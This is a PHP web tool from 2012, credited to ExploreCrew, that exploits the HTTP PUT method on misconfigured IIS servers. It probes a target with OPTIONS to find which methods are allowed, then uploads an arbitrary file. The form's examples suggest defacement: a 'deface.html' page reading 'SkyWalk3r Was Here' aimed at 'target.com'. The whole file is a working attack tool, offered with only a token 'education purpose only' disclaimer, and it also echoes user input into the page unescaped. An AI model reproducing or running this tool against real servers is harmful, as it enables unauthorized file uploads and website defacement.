<?php

/**
 * @author      ReGeL
 * @copyright	Copyright (C) 2012 Www.ExploreCrew.Org.
 * @license	    GNU General Public License version 2 or later; see LICENSE.txt 
**/

function check($host)
{
    error_reporting(0);
    $fp = @fsockopen($host,80,$errno,$errstr,60);
    if(!$fp)
    {
        $ret = $errstr($errno)."\n";
    }
    else
    {
        $out = "OPTIONS / HTTP/1.1\r\n";
        $out .= "Host: ".$host."\r\n";
        $out .= "User-Agent: Mozilla/5.0 Firefox/3.6.12\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp,$out);
        while(!feof($fp))
        {
            $ret .= fgets($fp,128);
        }
        return $ret;
        fclose($fp);
    }
}
function ExpPut($host,$file,$str)
{
    error_reporting(0);
    $fp = @fsockopen($host,80,$errno,$errstr,60);
    if(!$fp)
    {
        $ret = $errstr($errno)."\n";
    }
    else
    {
        $cmd = $str;
        $out = "PUT /".$file." HTTP/1.1\r\n";
        $out .= "Host: ".$host."\r\n";
        $out .= "User-Agent: Mozilla/5.0 Firefox/3.6.12\r\n";
        $out .= "Content-type: application/x-www-form-urlencoded\r\n";
        $out .= "Content-length: ".strlen($cmd)."\r\n";
        $out .= "Connection: Close\r\n\r\n";
        @fputs($fp,$out);
        @fputs($fp,$cmd);
        while(!feof($fp))
        {
            $ret .= fgets($fp,3600);
        }
        return $ret;
        fclose($fp);
    }
}
if(isset($_POST['check']))
{
    $str = check($_POST['host']);
    $output = '<p>'.$_POST['host'].'</p><p>Try Use:</p><ol start="1">';
    if(preg_match('/put/',strtolower($str)))
    {
        $output .= '<li>PUT</li>';
    }
    if(preg_match('/copy/',strtolower($str)))
    {
        $output .= '<li>COPY</li>';
    }
    if(preg_match('/delete/',strtolower($str)))
    {
        $output .= '<li>DELETE</li>';
    }
    if(preg_match('/move/',strtolower($str)))
    {
        $output .= '<li>MOVE</li>';
    }
    $output .= '</ol>';
    $output .= $str;
} elseif(isset($_POST['put']))
{
    $put = explode("\r\n\r\n",ExpPut($_POST['host'],$_POST['file'],$_POST['str']));
    if(preg_match('/created/',strtolower($put[0])))
    {
        $output .= "Berhasil bro... :D\n\n";
    }
    else
    {
        $output = "Gagal.. :'(\n\n";
    }
    $output .= $put[0];
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
	<meta name="author" content="Viva ExploreCrew" />
	<title>HTTP Attack IIS (Expoit PUT Method)</title>
    <!-- 
    Copyright (C) 2012 ExploreCrew.Org.
    All content education purphose only. 
    Any consequences in views of the use of scripts, techniques, codes, 
    tutorials, and everything imaginable are purely the 
    responsibility of the user, NOT ExploreCrew.Org
    -->
</head>
<body>
<form method="post" action="" enctype="multipart/form-data">
<table border="0">
	<tr>
		<td valign="top">File</td>
		<td valign="top"><input type="text" name="file" value="<?php echo $_POST['file'] ?>" /></td>
		<td valign="top">** contoh: deface.html</td>
	</tr>
	<tr>
		<td valign="top">Text</td>
		<td valign="top"><textarea name="str" rows="4" cols="50"><?php echo $_POST['str'] ?></textarea></td>
		<td valign="top">** contoh: &lt;html&gt;SkyWalk3r Was Here&lt;/html&gt;</td>
	</tr>
	<tr>
		<td valign="top">Host</td>
		<td valign="top"><input type="text" name="host" value="<?php echo $_POST['host'] ?>" /></td>
		<td valign="top">** contoh: target.com</td>
	</tr>
	<tr>
        <td valign="top"></td>
		<td valign="top"><input type="submit" name="check" value="Check" /><input type="submit" name="put" value="Send" /></td>
		<td valign="top"></td>
	</tr>    
</table>
</form>
<pre>
<?php echo $output ?>
</pre>
</body>
</html>
